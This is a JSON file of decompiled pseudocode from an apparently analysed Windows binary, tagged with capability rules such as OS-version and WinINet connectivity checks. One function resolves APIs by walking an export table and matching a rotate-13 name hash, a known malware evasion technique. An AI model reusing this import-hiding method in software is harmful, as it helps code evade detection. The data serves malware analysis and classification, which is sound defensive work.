{
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401350": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401350(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t *unaff_EBP;\n    uint *puVar8;\n    uint *puVar9;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        puVar2 = *param_1;\n        ppiVar7 = puVar2 + -4;\n        iVar5 = puVar2[-3];\n        puVar3 = (**(**ppiVar7 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            iVar4 = fcn.00401200();\n        }\n        if (iVar5 < param_2) {\n            param_2 = iVar5;\n        }\n        puVar3 = iVar4 + 0x10;\n        puVar9 = puVar3;\n        puVar8 = puVar2;\n        for (uVar6 = param_2 + 1U >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar9 = puVar9 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        for (uVar6 = param_2 + 1U & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *(iVar4 + 4) = iVar5;\n        piVar1 = puVar2 + -1;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar7 + 4))(ppiVar7);\n        }\n        *unaff_EBP = puVar3;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (iVar5 < param_2) {\n        if (iVar5 < 0x401) {\n            iVar5 = iVar5 * 2;\n        }\n        else {\n            iVar5 = iVar5 + 0x400;\n        }\n        if (iVar5 < param_2) {\n            iVar5 = param_2;\n        }\n        iVar5 = (**(**(*param_1 + -0x10) + 8))(*param_1 + -0x10, iVar5, 1);\n        if (iVar5 == 0) {\n            iVar5 = fcn.00401200();\n        }\n        *param_1 = iVar5 + 0x10;\n        return;\n    }\n    return;\n}\n",
        "token_count": 716
    },
    "004039a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004039a0(uint param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5, \n                      uint32_t param_6, uint param_7, uint32_t param_8, uint param_9, uchar param_10, uint param_11, \n                      uchar param_12)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    int32_t **ppiVar9;\n    uint uVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    uint8_t *puVar13;\n    int32_t **in_FS_OFFSET;\n    bool bVar14;\n    uint8_t *puVar15;\n    uint uStack68;\n    uint8_t *puStack64;\n    uchar *puStack60;\n    char *pcStack56;\n    char *pcStack52;\n    int32_t *piStack40;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *var_bp_10h;\n    int32_t **var_bp_ch;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x435873;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    iStack28 = 0;\n    pcStack52 = 0x4039c5;\n    piVar5 = fcn.00428235();\n    pcStack52 = 0x4039cc;\n    iVar6 = (**(*piVar5 + 0xc))();\n    iVar11 = iVar6 + 0x10;\n    uStack4 = NULL;\n    pcStack52 = 0x4039dc;\n    uVar7 = fcn.0041aefd();\n    uVar7 = uVar7 & 0x80000007;\n    if (uVar7 < 0) {\n        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n    }\n    if (uVar7 == 0) {\n        pcStack52 = 0x437d00;\n        pcStack56 = 0x4039fc;\n        fcn.00401cd0();\n        uStack8 = CONCAT31(uStack8._1_3_, 1);\n        if (*(iVar6 + 4) != 0) {\n            pcStack56 = 0x1;\n            puStack60 = 0x437c7c;\n            puStack64 = 0x403a18;\n            fcn.004018f0();\n        }\n        param_2 = *(param_8 - 0xc);\n        param_1 = param_8;\n        fcn.004018f0();\n        param_12 = 0;\n        piVar5 = param_6 - 4;\n        LOCK();\n        iVar11 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n        if (iVar11 == 1 || iVar11 + -1 < 0) {\n            uStack4 = 0x403a4c;\n            (**(**(param_6 - 0x10) + 4))();\n        }\n        uStack4 = &stack0x00000018;\n        uStack8 = 0x403a57;\n        puVar8 = fcn.00403190();\n        param_12 = 2;\n        if (*(param_5 + -0xc) != 0) {\n            param_1 = 0x437c7c;\n            uStack8 = 0x403a7a;\n            fcn.004018f0();\n        }\n        uStack4 = *puVar8;\n        iVar11 = *(uStack4 - 0xc);\n        uStack8 = 0x403a8a;\n        fcn.004018f0();\n        uStack8 = param_4 + -0x10;\n        param_10 = 0;\n        piVar5 = param_4 + -4;\n        LOCK();\n        iVar6 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n        if (iVar6 == 1 || iVar6 + -1 < 0) {\n            uStack12 = 0x403aac;\n            (**(**uStack8 + 4))();\n        }\n        uStack8 = &stack0x00000010;\n        uStack12 = 0x403ab6;\n        ppiVar9 = fcn.004032b0();\n        param_10 = 3;\n        if (*(param_3 + -0xc) != 0) {\n            uStack8 = 0x1;\n            uStack4 = 0x437c7c;\n            var_bp_ch = 0x403ad9;\n            fcn.004018f0();\n        }\n        uStack12 = *ppiVar9;\n        uStack8 = uStack12[-3];\n        var_bp_ch = 0x403ae9;\n        fcn.004018f0();\n        var_bp_ch = param_2 + -0x10;\n        param_8 = param_8 & 0xffffff00;\n        piVar5 = param_2 + -4;\n        LOCK();\n        iVar6 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n        if (iVar6 == 1 || iVar6 + -1 < 0) {\n            var_bp_10h = 0x403b0b;\n            (**(**var_bp_ch + 4))();\n        }\n        var_bp_10h = &stack0x00000008;\n        var_bp_ch = 0x1;\n        uStack24 = 0x403b17;\n        piVar5 = fcn.00403390();\n        param_8 = CONCAT31(param_8._1_3_, 4);\n        if (*(param_1 - 0xc) != 0) {\n            var_bp_ch = 0x1;\n            uStack12 = 0x437c7c;\n            uStack24 = 0x403b3a;\n            fcn.004018f0();\n        }\n        var_bp_10h = *piVar5;\n        var_bp_ch = *(var_bp_10h + -0xc);\n        uStack24 = 0x403b4a;\n        fcn.004018f0();\n        param_6 = param_6 & 0xffffff00;\n        piVar5 = iVar11 + -4;\n        LOCK();\n        iVar6 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n        if (iVar6 == 1 || iVar6 + -1 < 0) {\n            iStack28 = 0x403b6c;\n            uStack24 = iVar11 + -0x10;\n            (**(**(iVar11 + -0x10) + 4))();\n        }\n        iStack28 = 0x403b7a;\n        fcn.00401cd0();\n        param_5 = CONCAT31(param_5._1_3_, 5);\n        if (*(uStack8 - 0xc) != 0) {\n            iStack28 = 1;\n            fcn.004018f0();\n        }\n        piStack40 = uStack12;\n        fcn.004018f0();\n        piVar5 = var_bp_10h + -4;\n        LOCK();\n        iVar11 = *piVar5;\n        *piVar5 = *piVar5 + -1;\n        if (iVar11 == 1 || iVar11 + -1 < 0) {\n            (**(**(var_bp_10h + -0x10) + 4))();\n        }\n        fcn.00403500();\n        if (uStack24[-3] != NULL) {\n            piStack40 = 0x437c7c;\n            pcStack52 = 0x403bf9;\n            fcn.004018f0();\n        }\n        pcStack52 = 0x403c09;\n        fcn.004018f0();\n    }\n    else {\n        if (uVar7 == 1) {\n            pcStack56 = &stack0xffffffe4;\n            pcStack52 = NULL;\n            puStack60 = 0x403c48;\n            pcStack52 = fcn.00403190();\n            uStack4 = CONCAT31(uStack4._1_3_, 7);\n            pcStack56 = 0x403c5a;\n            fcn.004019f0();\n            uStack8 = uStack8 & 0xffffff00;\n            piVar5 = iVar11 + -4;\n            LOCK();\n            iVar6 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar6 == 1 || iVar6 + -1 < 0) {\n                puStack60 = 0x403c7c;\n                pcStack56 = iVar11 + -0x10;\n                (**(**(iVar11 + -0x10) + 4))();\n            }\n            piStack40 = 0x403c8b;\n            fcn.0041b056(uStack12, 0x437ba8);\n            fcn.00401c90();\n            piStack40 = 0x403cb1;\n            fcn.00403500();\n            param_3 = CONCAT31(param_3._1_3_, 8);\n            if (*(var_bp_ch + -0xc) != 0) {\n                piStack40 = 0x437c7c;\n                fcn.004018f0();\n            }\n            pcStack52 = 0x403ce4;\n            fcn.004018f0();\n            pcStack52 = iStack28 + -0x10;\n            uStack4 = uStack4 & 0xffffff00;\n            piVar5 = iStack28 + -4;\n            LOCK();\n            iVar11 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar11 == 1 || iVar11 + -1 < 0) {\n                pcStack56 = 0x403d0a;\n                (**(**pcStack52 + 4))();\n            }\n            goto code_r0x00404397;\n        }\n        if (uVar7 == 2) {\n            pcStack56 = &stack0xffffffe4;\n            pcStack52 = NULL;\n            puStack60 = 0x403d23;\n            pcStack52 = fcn.00403190();\n            uStack4 = CONCAT31(uStack4._1_3_, 9);\n            pcStack56 = 0x403d35;\n            fcn.004019f0();\n            pcStack56 = iVar11 + -0x10;\n            uStack8 = uStack8 & 0xffffff00;\n            piVar5 = iVar11 + -4;\n            LOCK();\n            iVar11 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar11 == 1 || iVar11 + -1 < 0) {\n                puStack60 = 0x403d57;\n                (**(**pcStack56 + 4))();\n            }\n            pcStack52 = &stack0xffffffe4;\n            pcStack56 = 0x403d61;\n            pcStack56 = fcn.00403620();\n            puStack60 = &stack0xffffffe0;\n            uStack4._0_1_ = 10;\n            puStack64 = 0x403d71;\n            fcn.00403880();\n            pcStack52 = iStack28 + -0x10;\n            uStack4._0_1_ = 0;\n            piVar5 = iStack28 + -4;\n            LOCK();\n            iVar11 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar11 == 1 || iVar11 + -1 < 0) {\n                pcStack56 = 0x403d96;\n                (**(**pcStack52 + 4))();\n            }\n            pcStack52 = &stack0xffffffe4;\n            pcStack56 = 0x403da0;\n            pcStack56 = fcn.004032b0();\n            puStack60 = &stack0xffffffe0;\n            uStack4._0_1_ = 0xb;\n            puStack64 = 0x403db0;\n            fcn.00403880();\n            pcStack52 = iStack28 + -0x10;\n            uStack4._0_1_ = 0;\n            piVar5 = iStack28 + -4;\n            LOCK();\n            iVar11 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar11 == 1 || iVar11 + -1 < 0) {\n                pcStack56 = 0x403dd5;\n                (**(**pcStack52 + 4))();\n            }\n            pcStack56 = &stack0xffffffe4;\n            pcStack52 = 0x1;\n            puStack60 = 0x403de1;\n            puStack60 = fcn.00403190();\n            puStack64 = &stack0xffffffe0;\n            uStack4 = CONCAT31(uStack4._1_3_, 0xc);\n            uStack68 = 0x403df1;\n            fcn.00403880();\n        }\n        else {\n            if (uVar7 != 3) {\n                if (uVar7 == 4) {\n                    pcStack56 = &stack0xffffffe4;\n                    pcStack52 = 0x1;\n                    puStack60 = 0x403f30;\n                    pcStack52 = fcn.00403390();\n                    uStack4 = CONCAT31(uStack4._1_3_, 0x13);\n                    pcStack56 = 0x403f42;\n                    fcn.004019f0();\n                    uStack8 = uStack8 & 0xffffff00;\n                    pcStack56 = 0x403f4f;\n                    fcn.00401420();\n                    pcStack56 = \"makes\";\n                    puStack60 = 0x403f5d;\n                    fcn.00401cd0();\n                    puStack60 = &stack0xffffffdc;\n                    puStack64 = &stack0xffffffd8;\n                    uStack12._0_1_ = 0x14;\n                    uStack68 = 0x403f71;\n                    fcn.00403880();\n                    uStack12._0_1_ = 0;\n                    puStack60 = 0x403f81;\n                    fcn.00401420();\n                    puStack64 = &stack0xffffffdc;\n                    puStack60 = 0x1;\n                    uStack68 = 0x403f8d;\n                    uStack68 = fcn.00403190();\n                    uStack12._0_1_ = 0x15;\n                    fcn.00403880(&stack0xffffffd8);\n                    uStack12._0_1_ = 0;\n                    puStack60 = 0x403fad;\n                    fcn.00401420();\n                    puStack60 = 0x403fb2;\n                    uVar7 = fcn.0041aefd();\n                    uVar7 = uVar7 & 0x80000001;\n                    bVar14 = uVar7 == 0;\n                    if (uVar7 < 0) {\n                        bVar14 = (uVar7 - 1 | 0xfffffffe) == 0xffffffff;\n                    }\n                    if (bVar14) {\n                        puStack60 = &stack0xffffffdc;\n                        puStack64 = 0x403fca;\n                        puStack64 = fcn.004036e0();\n                        uStack68 = &stack0xffffffd8;\n                        uStack12 = CONCAT31(uStack12._1_3_, 0x16);\n                        fcn.00403880();\n                    }\n                    else {\n                        puStack60 = &stack0xffffffdc;\n                        puStack64 = 0x403fec;\n                        puStack64 = fcn.004032b0();\n                        uStack68 = &stack0xffffffd8;\n                        uStack12._0_1_ = 0x17;\n                        fcn.00403880();\n                        uStack12._0_1_ = 0;\n                        puStack60 = 0x40400c;\n                        fcn.00401420();\n                        puStack64 = &stack0xffffffdc;\n                        puStack60 = 0x1;\n                        uStack68 = 0x404018;\n                        uStack68 = fcn.00403190();\n                        uStack12 = CONCAT31(uStack12._1_3_, 0x18);\ncode_r0x00404382:\n                        fcn.00403880(&stack0xffffffd8);\n                    }\n                }\n                else if (uVar7 == 5) {\n                    pcStack52 = &stack0xffffffe4;\n                    pcStack56 = 0x40403b;\n                    pcStack52 = fcn.00403500();\n                    uStack4 = CONCAT31(uStack4._1_3_, 0x19);\n                    pcStack56 = 0x40404d;\n                    fcn.004019f0();\n                    uStack8 = uStack8 & 0xffffff00;\n                    pcStack56 = 0x40405a;\n                    fcn.00401420();\n                    puStack60 = &stack0xffffffe0;\n                    pcStack56 = 0x1;\n                    puStack64 = 0x404066;\n                    puStack64 = fcn.00403390();\n                    uStack68 = &stack0xffffffdc;\n                    uStack8._0_1_ = 0x1a;\n                    fcn.00403880();\n                    uStack8 = uStack8._1_3_ << 8;\n                    pcStack56 = 0x404086;\n                    fcn.00401420();\n                    pcStack56 = 0x437cd4;\n                    puStack60 = 0x404094;\n                    fcn.00401cd0();\n                    puStack60 = &stack0xffffffdc;\n                    puStack64 = &stack0xffffffd8;\n                    uStack12._0_1_ = 0x1b;\n                    uStack68 = 0x4040a8;\n                    fcn.00403880();\n                    uStack12._0_1_ = 0;\n                    puStack60 = 0x4040b8;\n                    fcn.00401420();\n                    puStack60 = &stack0xffffffdc;\n                    puStack64 = 0x4040c2;\n                    puStack64 = fcn.004037c0();\n                    uStack68 = &stack0xffffffd8;\n                    uStack12 = CONCAT31(uStack12._1_3_, 0x1c);\n                    fcn.00403880();\n                }\n                else {\n                    if (uVar7 == 6) {\n                        pcStack52 = \"free\";\n                        pcStack56 = 0x4040f1;\n                        fcn.00401cd0();\n                        pcStack56 = \"kill\";\n                        uStack8 = CONCAT31(uStack8._1_3_, 0x1d);\n                        puStack60 = 0x404104;\n                        fcn.00401cd0();\n                        puStack60 = 0x437ce8;\n                        uStack12 = CONCAT31(uStack12._1_3_, 0x1e);\n                        puStack64 = 0x404117;\n                        fcn.00401cd0();\n                        puStack64 = 0x4430d0;\n                        uStack68 = 0x3;\n                        var_bp_ch = CONCAT31(var_bp_ch._1_3_, 0x1f);\n                        iVar11 = fcn.00401000();\n                        puStack64 = &stack0xffffffdc + iVar11 * 4;\n                        uStack68 = 0x404139;\n                        fcn.004019f0();\n                        uStack68 = 0x437cc0;\n                        fcn.00401cd0();\n                        uStack24._0_1_ = 0x20;\n                        fcn.00403880(&stack0xffffffcc, &stack0xffffffd0);\n                        uStack24._0_1_ = 0x1f;\n                        fcn.00401420();\n                        uVar10 = fcn.00401d80(&stack0xffffffd0, 1);\n                        uStack24._0_1_ = 0x21;\n                        fcn.00403880(&stack0xffffffcc, uVar10);\n                        fcn.00401420();\n                        uStack24 = uStack24._1_3_ << 8;\n                        fcn.0041b954(&stack0xffffffd4, 4, 3, fcn.00401420);\n                        goto code_r0x00404397;\n                    }\n                    if (uVar7 != 7) {\n                        if (uVar7 != 8) goto code_r0x00404397;\n                        pcStack52 = 0x437ca8;\n                        pcStack56 = 0x4042e5;\n                        fcn.00401c50();\n                        puStack60 = &stack0xffffffe0;\n                        pcStack56 = NULL;\n                        puStack64 = 0x4042f0;\n                        puStack64 = fcn.00401d80();\n                        uStack68 = &stack0xffffffdc;\n                        uStack8._0_1_ = 0x28;\n                        fcn.00403880();\n                        uStack8 = uStack8._1_3_ << 8;\n                        pcStack56 = 0x404310;\n                        fcn.00401420();\n                        pcStack56 = \"ate my\";\n                        puStack60 = 0x40431e;\n                        fcn.00401cd0();\n                        puStack60 = &stack0xffffffdc;\n                        puStack64 = &stack0xffffffd8;\n                        uStack12._0_1_ = 0x29;\n                        uStack68 = 0x404332;\n                        fcn.00403880();\n                        uStack12._0_1_ = 0;\n                        puStack60 = 0x404342;\n                        fcn.00401420();\n                        puStack60 = 0x404347;\n                        uVar7 = fcn.0041aefd();\n                        uVar7 = uVar7 & 0x80000001;\n                        bVar14 = uVar7 == 0;\n                        if (uVar7 < 0) {\n                            bVar14 = (uVar7 - 1 | 0xfffffffe) == 0xffffffff;\n                        }\n                        puStack60 = NULL;\n                        if (bVar14) {\n                            puStack64 = &stack0xffffffdc;\n                            uStack68 = 0x404360;\n                            uStack68 = fcn.00401d80();\n                            uStack12 = CONCAT31(uStack12._1_3_, 0x2a);\n                        }\n                        else {\n                            puStack64 = &stack0xffffffdc;\n                            uStack68 = 0x404377;\n                            uStack68 = fcn.00403390();\n                            uStack12 = CONCAT31(uStack12._1_3_, 0x2b);\n                        }\n                        goto code_r0x00404382;\n                    }\n                    pcStack52 = \"Seeing a\";\n                    pcStack56 = 0x4041c7;\n                    fcn.00401c50();\n                    puStack60 = &stack0xffffffe0;\n                    pcStack56 = NULL;\n                    puStack64 = 0x4041d2;\n                    puStack64 = fcn.00401d80();\n                    uStack68 = &stack0xffffffdc;\n                    uStack8._0_1_ = 0x22;\n                    fcn.00403880();\n                    uStack8 = uStack8._1_3_ << 8;\n                    pcStack56 = 0x4041f2;\n                    fcn.00401420();\n                    pcStack56 = \"eating\";\n                    puStack60 = 0x404200;\n                    fcn.00401cd0();\n                    puStack60 = &stack0xffffffdc;\n                    puStack64 = &stack0xffffffd8;\n                    uStack12._0_1_ = 0x23;\n                    uStack68 = 0x404214;\n                    fcn.00403880();\n                    uStack12._0_1_ = 0;\n                    puStack60 = 0x404224;\n                    fcn.00401420();\n                    puStack60 = 0x404229;\n                    uVar7 = fcn.0041aefd();\n                    uVar7 = uVar7 & 0x80000001;\n                    bVar14 = uVar7 == 0;\n                    if (uVar7 < 0) {\n                        bVar14 = (uVar7 - 1 | 0xfffffffe) == 0xffffffff;\n                    }\n                    puStack60 = 0x1;\n                    if (bVar14) {\n                        puStack64 = &stack0xffffffdc;\n                        uStack68 = 0x404243;\n                        uStack68 = fcn.00401d80();\n                        uStack12._0_1_ = 0x24;\n                    }\n                    else {\n                        puStack64 = &stack0xffffffdc;\n                        uStack68 = 0x40425a;\n                        uStack68 = fcn.00403390();\n                        uStack12._0_1_ = 0x25;\n                    }\n                    fcn.00403880(&stack0xffffffd8);\n                    uStack12 = uStack12._1_3_ << 8;\n                    puStack60 = 0x40427a;\n                    fcn.00401420();\n                    puStack60 = 0x437cd4;\n                    puStack64 = 0x404288;\n                    fcn.00401cd0();\n                    puStack64 = &stack0xffffffd8;\n                    uStack68 = &stack0xffffffd4;\n                    var_bp_ch._0_1_ = 0x26;\n                    fcn.00403880();\n                    var_bp_ch._0_1_ = 0;\n                    puStack64 = 0x4042ac;\n                    fcn.00401420();\n                    puStack64 = &stack0xffffffd8;\n                    uStack68 = 0x4042b6;\n                    uStack68 = fcn.00402060();\n                    var_bp_ch = CONCAT31(var_bp_ch._1_3_, 0x27);\n                    fcn.00403880(&stack0xffffffd4);\n                }\n                uStack4 = uStack4 & 0xffffff00;\n                pcStack52 = 0x404397;\n                fcn.00401420();\n                goto code_r0x00404397;\n            }\n            pcStack52 = 0x403e07;\n            uVar7 = fcn.0041aefd();\n            uVar7 = uVar7 & 0x80000001;\n            bVar14 = uVar7 == 0;\n            if (uVar7 < 0) {\n                bVar14 = (uVar7 - 1 | 0xfffffffe) == 0xffffffff;\n            }\n            pcStack52 = &stack0xffffffe4;\n            if (bVar14) {\n                pcStack52 = 0x437ce8;\n                pcStack56 = 0x403e23;\n                fcn.00401cd0();\n                pcStack56 = &stack0xffffffe0;\n                puStack60 = &stack0xffffffdc;\n                uStack8._0_1_ = 0xd;\n                puStack64 = 0x403e37;\n                fcn.00403880();\n                uStack8._0_1_ = 0;\n                pcStack56 = 0x403e47;\n                fcn.00401420();\n                puStack60 = &stack0xffffffe0;\n                pcStack56 = 0x1;\n                puStack64 = 0x403e53;\n                fcn.00403390();\n                uStack68 = &stack0xffffffdc;\n                uStack8 = CONCAT31(uStack8._1_3_, 0xe);\n            }\n            else {\n                pcStack56 = 0x403e66;\n                pcStack56 = fcn.004032b0();\n                puStack60 = &stack0xffffffe0;\n                uStack4._0_1_ = 0xf;\n                puStack64 = 0x403e76;\n                fcn.00403880();\n                uStack4._0_1_ = 0;\n                pcStack52 = 0x403e86;\n                fcn.00401420();\n                pcStack56 = &stack0xffffffe4;\n                pcStack52 = 0x1;\n                puStack60 = 0x403e92;\n                puStack60 = fcn.00403190();\n                uStack4 = CONCAT31(uStack4._1_3_, 0x10);\n            }\n            puStack64 = 0x403ea2;\n            fcn.00403880();\n            fcn.00401420();\n            pcStack52 = 0x403ec0;\n            fcn.00401cd0();\n            pcStack52 = &stack0xffffffe4;\n            pcStack56 = &stack0xffffffe0;\n            uStack4._0_1_ = 0x11;\n            puStack60 = 0x403ed4;\n            fcn.00403880();\n            pcStack52 = iStack28 + -0x10;\n            uStack4._0_1_ = 0;\n            piVar5 = iStack28 + -4;\n            LOCK();\n            iVar11 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n            if (iVar11 == 1 || iVar11 + -1 < 0) {\n                pcStack56 = 0x403ef9;\n                (**(**pcStack52 + 4))();\n            }\n            pcStack52 = &stack0xffffffe4;\n            pcStack56 = 0x403f03;\n            pcStack56 = fcn.004036e0();\n            puStack60 = &stack0xffffffe0;\n            uStack4 = CONCAT31(uStack4._1_3_, 0x12);\n            puStack64 = 0x403f13;\n            fcn.00403880();\n        }\n    }\n    pcStack52 = iStack28 + -0x10;\n    uStack4 = uStack4 & 0xffffff00;\n    piVar5 = iStack28 + -4;\n    LOCK();\n    iVar11 = *piVar5;\n    *piVar5 = *piVar5 + -1;\n    if (iVar11 == 1 || iVar11 + -1 < 0) {\n        pcStack56 = 0x403c2f;\n        (**(**pcStack52 + 4))();\n    }\ncode_r0x00404397:\n    pcStack52 = 0x437c9c;\n    pcStack56 = 0x437c98;\n    puStack60 = 0x4043aa;\n    fcn.00401600();\n    puStack60 = 0x437c94;\n    puStack64 = 0x437c90;\n    uStack68 = 0x4043bd;\n    fcn.00401600();\n    uStack68 = 0x437c8c;\n    fcn.00401600(0x437c88);\n    puVar15 = 0x437c80;\n    fcn.00401600(0x437c80, 0x437c84);\n    piVar5 = fcn.00428235();\n    iVar11 = (**(*piVar5 + 0xc))();\n    puVar13 = puStack64;\n    puStack60 = iVar11 + 0x10;\n    if (*(puStack64 + -0xc) < 0) {\n        fcn.004010f0(0x80070057);\n    }\n    pcVar12 = &stack0xffffffbc;\n    uStack68 = uStack68 & 0xffff0000 | *puVar13;\n    do {\n        cVar2 = *pcVar12;\n        pcVar12 = pcVar12 + 1;\n    } while (cVar2 != '\\0');\n    fcn.00401560(&stack0xffffffbc, pcVar12 - &stack0xffffffbd);\n    fcn.00401800();\n    puVar3 = uStack68;\n    if (*(uStack68 + -0xc) < 0) {\n        fcn.004010f0(0x80070057);\n    }\n    iVar11 = *(puVar13 + -0xc);\n    iVar6 = *puVar3 << 0x18;\n    if (0 < iVar11) goto code_r0x0040446e;\n    do {\n        fcn.004010f0();\ncode_r0x0040446e:\n        if (1 < *(puVar13 + -4)) {\n            puVar1 = puVar13 + -0xc;\n            puVar13 = puVar15;\n            fcn.00401210(*puVar1);\n            puVar15 = puVar13;\n        }\n        *puVar13 = iVar6 >> 0x18;\n    } while ((iVar11 < 0) || (*(puVar13 + -8) < iVar11));\n    *(puVar13 + -0xc) = iVar11;\n    puVar13[iVar11] = 0;\n    ppiVar9 = puVar13 + -0x10;\n    iVar11 = fcn.004013a0(ppiVar9);\n    piVar4 = piStack40;\n    *piStack40 = iVar11 + 0x10;\n    piVar5 = puVar3 + -4;\n    LOCK();\n    iVar11 = *piVar5;\n    *piVar5 = *piVar5 + -1;\n    if (iVar11 + -1 < 1) {\n        (**(**(puVar3 + -0x10) + 4))(puVar3 + -0x10);\n    }\n    piVar5 = puVar13 + -4;\n    LOCK();\n    iVar11 = *piVar5;\n    *piVar5 = *piVar5 + -1;\n    if (iVar11 == 1 || iVar11 + -1 < 0) {\n        (**(**ppiVar9 + 4))(ppiVar9);\n    }\n    *in_FS_OFFSET = pcStack56;\n    return piVar4;\n}\n",
        "token_count": 7596
    },
    "00404990": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00404990(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint32_t uVar12;\n    uint *puVar13;\n    uint32_t uStack28;\n    \n    iVar9 = 0;\n    iVar2 = **0x4430d4;\n    piVar6 = *0x4430d4;\n    while (iVar2 != 0) {\n        piVar6 = piVar6 + 1;\n        iVar9 = iVar9 + 1;\n        iVar2 = *piVar6;\n    }\n    iVar7 = *(*(*0x4430f4 + param_1) + *0x4430f8 + param_1) + param_1;\n    uVar3 = *(*0x4430fc + iVar7);\n    iVar4 = *(*0x443100 + iVar7);\n    iVar5 = *(*0x443104 + iVar7);\n    iVar7 = *(*0x443108 + iVar7);\n    uStack28 = 0;\n    uVar10 = 0;\n    if (uVar3 != 0) {\n        do {\n            piVar6 = *0x4430d4;\n            puVar13 = *(iVar5 + param_1 + uStack28 * 4) + param_1;\n            puVar11 = puVar13;\n            do {\n                cVar1 = *puVar11;\n                puVar11 = puVar11 + 1;\n            } while (cVar1 != '\\0');\n            uVar12 = puVar11 - (puVar13 + 1);\n            puVar8 = fcn.00428fe1(uVar12 + 1);\n            *(uVar12 + puVar8) = 0;\n            puVar11 = puVar8;\n            for (uVar10 = uVar12 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n                *puVar11 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            for (uVar10 = uVar12 & 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n                *puVar11 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            fcn.004047d0(piVar6, iVar9, puVar8, uVar12);\n            uVar12 = 0;\n            do {\n                cVar1 = *puVar8;\n                uVar12 = *puVar8 + (uVar12 << 0x13 | uVar12 >> 0xd);\n                puVar8 = puVar8 + 1;\n            } while (cVar1 != '\\0');\n            uVar10 = uStack28;\n        } while ((uVar12 != param_2) && (uVar10 = uStack28 + 1,  uStack28 = uVar10,  uVar10 < uVar3));\n    }\n    if (uVar10 == uVar3) {\n        return 0;\n    }\n    return *(iVar4 + param_1 + *(iVar7 + param_1 + uVar10 * 2) * 4) + param_1;\n}\n",
        "token_count": 808
    },
    "0041c0a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
